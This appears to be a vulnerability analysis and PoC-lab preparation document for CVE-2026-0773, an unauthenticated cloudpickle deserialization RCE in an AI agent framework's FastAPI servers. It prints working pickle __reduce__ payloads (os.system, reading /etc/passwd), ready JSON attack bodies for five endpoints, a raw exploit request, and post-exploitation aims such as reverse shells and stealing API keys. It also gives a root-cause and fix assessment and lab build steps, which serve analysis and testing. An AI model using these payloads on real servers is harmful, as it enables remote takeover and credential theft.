# Vulnerability Analysis: CVE-2026-0773

## Root Cause

**CWE-502 — Deserialization of Untrusted Data**

The Upsonic AI Agent Framework (v0.36.0 through v0.55.6) exposes multiple unauthenticated FastAPI HTTP endpoints that accept base64-encoded Python `cloudpickle` (or `pickle`) serialized objects from user-controlled request parameters and deserialize them without any validation, authentication, or sandboxing. Python's pickle protocol allows arbitrary code execution during deserialization via the `__reduce__` method, meaning an attacker can achieve Remote Code Execution (RCE) by sending a crafted payload.

The root cause is the direct use of `cloudpickle.loads()` on attacker-controlled HTTP request body data with no preceding authentication, authorization, integrity verification, or type restriction.

## Vulnerable File(s) and Function(s)

### Primary Vulnerability — `add_tool` endpoint (tools_server, port 8086 via proxy on port 7541)

**File**: `src/upsonic/tools_server/server/tools.py`, lines 370–383
```python
class AddToolRequest(BaseModel):
    function: str

@app.post(f"{prefix}/add_tool")       # prefix = "/tools"
@timeout(30.0)
async def add_tool(request: AddToolRequest):
    decoded_function = base64.b64decode(request.function)       # line 377
    deserialized_function = cloudpickle.loads(decoded_function)  # line 378 — RCE
    add_tool_(deserialized_function)
    return {"message": "Tool added successfully"}
```

**Proxy on main server** — `src/upsonic/server/tools/server.py`, lines 55–62:
```python
@app.post(f"{prefix}/add_tool")
async def add_tool(request: AddToolRequest):
    with ToolManager() as tool_client:
        tool_client.add_tool(request.function)   # Forwards to tools_server:8086
    return {"message": "Tool added successfully"}
```

**Proxy client** — `src/upsonic/tools_server/tools_client.py`, lines 60–70:
```python
def add_tool(self, function) -> Dict[str, Any]:
    with httpx.Client(timeout=600.0) as session:
        response = session.post(
            f"{self.base_url}/tools/add_tool",  # http://localhost:8086
            json={"function": function},
        )
```

### Related Attack Surface — Same Deserialization Pattern on Main Server (Port 7541)

#### 1. `POST /level_one/gpt4o` — `response_format` field
**File**: `src/upsonic/server/level_one/server/server.py`, lines 44–45
```python
pickled_data = base64.b64decode(request.response_format)
response_format = cloudpickle.loads(pickled_data)  # RCE
```
Triggered when `request.response_format != "str"` (line 41).

#### 2. `POST /level_one/gpt4o` — `context` field
**File**: `src/upsonic/server/level_one/server/server.py`, lines 66–67
```python
pickled_context = base64.b64decode(request.context)
context = cloudpickle.loads(pickled_context)  # RCE
```
Triggered when `request.context is not None` (line 64).

#### 3. `POST /level_two/agent` — `response_format` field
**File**: `src/upsonic/server/level_two/server/server.py`, lines 48–49
```python
pickled_data = base64.b64decode(request.response_format)
response_format = cloudpickle.loads(pickled_data)  # RCE
```
Triggered when `request.response_format != "str"` (line 45).

#### 4. `POST /level_two/agent` — `context` field
**File**: `src/upsonic/server/level_two/server/server.py`, lines 64–65
```python
pickled_context = base64.b64decode(request.context)
context = cloudpickle.loads(pickled_context)  # RCE
```
Triggered when `request.context is not None` (line 62).

#### 5. `POST /tools/add_mcp_tool` — Arbitrary command execution
**File**: `src/upsonic/tools_server/server/tools.py`, lines 399–434, 573–580
```python
async def add_mcp_tool_(name, command, args, env):
    server = Server(command=command, args=args, env=env, name=name)
    await server.initialize()  # Starts subprocess with attacker-controlled command
```
This is a different vulnerability class (CWE-78: OS Command Injection) but achieves the same RCE impact via the MCP stdio_client subprocess mechanism.

#### 6. `POST /tools/install_library` — Malicious package installation
**File**: `src/upsonic/tools_server/server/tools.py`, lines 263–274
```python
def install_library_(library):
    result = subprocess.run(["uv", "pip", "install", library], ...)
```
Allows installing arbitrary PyPI packages — could install a malicious package with setup.py code execution.

**Note**: Items 1-4 above are **directly on the main server (port 7541, bound to 0.0.0.0)** and do NOT require the tools_server proxy chain. They are independent deserialization sinks accessible from the same network-exposed endpoint.

## Triggering Input

### Primary Vector (simplest, most reliable)

**Target**: `POST http://<target>:7541/tools/add_tool`
**Content-Type**: `application/json`
**Body**: `{"function": "<base64-encoded cloudpickle payload>"}`

**Payload generation**:
```python
import cloudpickle
import base64
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ("id > /tmp/pwned",))

payload = base64.b64encode(cloudpickle.dumps(Exploit())).decode()
# payload is now the base64 string to embed in JSON
```

The `__reduce__` method is the standard Python pickle gadget — during deserialization, `cloudpickle.loads()` calls `os.system("id > /tmp/pwned")` to execute the command. Any callable and arguments can be substituted (e.g., `subprocess.check_output`, `exec`, reverse shells).

### Alternative Vectors (all on port 7541, no proxy needed)

**Vector A** — `POST /level_one/gpt4o`:
```json
{
    "prompt": "anything",
    "response_format": "<base64-encoded cloudpickle RCE payload>"
}
```
The `response_format` field is deserialized if its value is not the literal string `"str"`.

**Vector B** — `POST /level_one/gpt4o`:
```json
{
    "prompt": "anything",
    "context": "<base64-encoded cloudpickle RCE payload>"
}
```

**Vector C** — `POST /level_two/agent`:
```json
{
    "agent_id": "anything",
    "prompt": "anything",
    "response_format": "<base64-encoded cloudpickle RCE payload>"
}
```

**Vector D** — `POST /level_two/agent`:
```json
{
    "agent_id": "anything",
    "prompt": "anything",
    "context": "<base64-encoded cloudpickle RCE payload>"
}
```

All vectors use the identical cloudpickle payload — only the endpoint URL and JSON field name differ.

## Attack Scenario

1. **Reconnaissance**: Attacker identifies an Upsonic server running on port 7541 (default). Can confirm via `GET /status` which returns `{"status": "Server is running"}` with no authentication.

2. **Payload Construction**: Attacker generates a malicious cloudpickle payload using `__reduce__` to execute arbitrary commands:
   ```python
   import cloudpickle, base64, subprocess
   class RCE:
       def __reduce__(self):
           return (subprocess.check_output, (["cat", "/etc/passwd"],))
   payload = base64.b64encode(cloudpickle.dumps(RCE())).decode()
   ```

3. **Exploitation**: Attacker sends a single HTTP POST request:
   ```
   POST /tools/add_tool HTTP/1.1
   Host: target:7541
   Content-Type: application/json
   
   {"function": "<payload>"}
   ```

4. **Code Execution**: The server decodes the base64 string, passes it to `cloudpickle.loads()`, which invokes the `__reduce__` method during deserialization, executing the attacker's command with the privileges of the Upsonic server process.

5. **Post-Exploitation**: Attacker achieves full control — can establish a reverse shell, exfiltrate data, pivot to internal networks, or deploy persistent backdoors.

## Impact

- **Remote Code Execution (RCE)** — Full arbitrary command execution on the server
- **CVSS 9.8 Critical** — Network-accessible, no authentication, no user interaction, high impact on confidentiality, integrity, and availability
- **Pre-authentication** — No credentials, API keys, tokens, or session cookies required
- **Full server compromise** — Code runs as the Upsonic server process user
- **Data exfiltration** — Access to all server-side data, environment variables (including LLM API keys stored in configuration), and connected systems
- **Lateral movement** — Can pivot to internal systems accessible from the server

## Authentication Requirements

**None.** This is a pre-authentication vulnerability.

- No API keys, tokens, passwords, or session cookies are required
- No authentication middleware exists on any endpoint
- The main server binds to `0.0.0.0:7541` (all interfaces) by default
- Status endpoint (`GET /status`) can be used to fingerprint the target
- All vulnerable endpoints accept unauthenticated HTTP POST requests with JSON bodies

The PoC agent does NOT need to implement any authentication flow.

## Fix Assessment

**The fix is thorough and complete.**

The fix commit (`a54529acc6e4bfe28f4f5c80c058144348a306b7`, "Stability (#360)", 2025-06-15) completely removes the entire vulnerable server architecture:
- Deleted `src/upsonic/tools_server/` (entire directory — contains the primary `cloudpickle.loads()` sink)
- Deleted `src/upsonic/server/` (entire directory — contains all proxy endpoints and the related `cloudpickle.loads()` sinks in level_one and level_two)
- Deleted `src/upsonic/server_manager.py` (server process management)
- Deleted `run_main_server.py` and `run_tools_server.py` (entry points)
- Deleted `src/upsonic/tools.py`, `src/upsonic/reliability_processor.py`

The project was restructured from a client-server model (with network-exposed FastAPI endpoints) to a library/SDK model. Since all vulnerable network-facing code was removed — not patched — there are no bypass possibilities. No endpoints exist to receive attacker-controlled data for deserialization.

**Note**: This was NOT an explicit security fix. It was a major architectural refactoring. The ZDI advisory (published Jan 2026) notes "no patch" because the vendor did not formally acknowledge the CVE, even though the vulnerable code was removed prior to the advisory.

## Potential Bypass Vectors

None. The fix removes the entire attack surface (all server endpoints). There is no code left to bypass.

## Escalation Path

The vulnerability directly provides **Remote Code Execution** — the highest-impact primitive. No escalation chain is needed. The `__reduce__` deserialization gadget in `cloudpickle.loads()` allows executing any Python callable with any arguments, which maps directly to arbitrary OS command execution.

Additionally, the server process has access to:
- Environment variables containing LLM API keys (OpenAI, Anthropic, etc.) stored via the `Configuration` class
- Any files accessible to the server process user
- Network access to internal services reachable from the server host

## Related Attack Surface

### Same vulnerability pattern (cloudpickle/pickle deserialization of untrusted data)

| # | Endpoint | File | Line | Field | Server |
|---|----------|------|------|-------|--------|
| 1 | `POST /tools/add_tool` | `src/upsonic/tools_server/server/tools.py` | 378 | `function` | tools_server (8086), proxied from main (7541) |
| 2 | `POST /level_one/gpt4o` | `src/upsonic/server/level_one/server/server.py` | 45 | `response_format` | main (7541) — **direct, no proxy** |
| 3 | `POST /level_one/gpt4o` | `src/upsonic/server/level_one/server/server.py` | 67 | `context` | main (7541) — **direct, no proxy** |
| 4 | `POST /level_two/agent` | `src/upsonic/server/level_two/server/server.py` | 49 | `response_format` | main (7541) — **direct, no proxy** |
| 5 | `POST /level_two/agent` | `src/upsonic/server/level_two/server/server.py` | 65 | `context` | main (7541) — **direct, no proxy** |

### Different vulnerability class but same impact (command execution)

| # | Endpoint | File | Line | Mechanism |
|---|----------|------|------|-----------|
| 6 | `POST /tools/add_mcp_tool` | `src/upsonic/tools_server/server/tools.py` | 399-434 | Arbitrary subprocess via MCP stdio_client |
| 7 | `POST /tools/install_library` | `src/upsonic/tools_server/server/tools.py` | 263-274 | `subprocess.run(["uv", "pip", "install", <user_input>])` |

### Client-side deserialization (not directly exploitable via network)

| # | File | Line | Notes |
|---|------|------|-------|
| 8 | `src/upsonic/storage/caching.py` | 63 | `cloudpickle.loads()` on data from local SQLite cache — requires prior cache poisoning |
| 9 | `src/upsonic/client/level_utilized/utility.py` | 87 | `cloudpickle.loads()` on server response — exploitable if attacker controls the server (MITM scenario) |

**For PoC testing**: Vectors 1–5 are all directly exploitable and should be tested. Vector 1 (`/tools/add_tool`) is the simplest and most reliable, requiring only one JSON field. Vectors 2–5 provide alternative paths that do NOT require the tools_server to be running (they execute directly on the main server process).

## Build System

- **Build backend**: hatchling (defined in `pyproject.toml`)
- **Package manager**: pip (or uv)
- **Python**: >= 3.10

## Build Commands

### Option A — Install from Git tag (recommended for lab)
```bash
pip install "git+https://github.com/Upsonic/Upsonic.git@v0.55.6"
```

### Option B — Install from local source
```bash
cd /opt/upsonic
git checkout v0.55.6
pip install -e .
```

### Start the vulnerable servers
```bash
# Option 1: Start both servers together
python -c "from upsonic.server import run_dev_server; run_dev_server()"

# Option 2: Start servers individually
python run_main_server.py    # Main server on 0.0.0.0:7541
python run_tools_server.py   # Tools server on localhost:8086

# Option 3: Direct uvicorn commands
python -m uvicorn upsonic.server.api:app --host 0.0.0.0 --port 7541
python -m uvicorn upsonic.tools_server.server.api:app --host localhost --port 8086
```

## Dependencies

### Core runtime dependencies (from pyproject.toml)
| Package | Version | Purpose |
|---------|---------|---------|
| cloudpickle | >=3.1.0 | **Vulnerable deserialization library** |
| fastapi | >=0.115.6 | HTTP API framework |
| uvicorn | >=0.34.0 | ASGI server |
| httpx | >=0.27.2 | Internal server-to-server HTTP client |
| dill | >=0.3.9 | Serialization (client-side) |
| psutil | ==6.1.1 | Process/port management |
| pydantic | ==2.10.5 | Request/response models |
| mcp[cli] | ==1.5.0 | MCP server framework |
| python-dotenv | >=1.0.1 | Environment config |
| pydantic-ai | ==0.1.3 | AI model integration |
| rich | >=13.9.4 | Console output |

### For PoC script (attacker side)
| Package | Version | Purpose |
|---------|---------|---------|
| cloudpickle | any | Payload generation |
| requests or httpx | any | HTTP POST to target |

## Runtime Requirements

### Server architecture
The vulnerable version runs **two servers** that must both be running:
1. **Main server**: `upsonic.server.api:app` on port **7541** — binds to `0.0.0.0` (all interfaces). This is the externally-accessible attack target.
2. **Tools server**: `upsonic.tools_server.server.api:app` on port **8086** — binds to `localhost`. This receives proxied requests from the main server for the `/tools/*` endpoints.

**IMPORTANT for Lab Build**: Vectors 2–5 (level_one/level_two endpoints) only require the main server (port 7541) to be running. They do NOT proxy to the tools_server. Only Vector 1 (`/tools/add_tool`) requires both servers.

### Network ports
- **7541/tcp** — Main server (must be accessible from PoC script)
- **8086/tcp** — Tools server (localhost only, accessed internally by main server)

### Configuration
- No configuration files needed
- No database setup needed
- No environment variables required for exploitation (LLM API keys are only needed for legitimate AI operations, not for triggering the deserialization)
- The servers start with default settings out of the box

### Docker lab recommendations
- **Base image**: `python:3.10-slim` or `python:3.11-slim`
- **Install**: `pip install "upsonic==0.55.6"` or from source at tag v0.55.6
- **Expose**: Port 7541 (main server)
- **Entrypoint**: Start both servers using `run_dev_server()` or separate uvicorn processes
- **Health check**: `GET http://localhost:7541/status` should return `{"status": "Server is running"}`
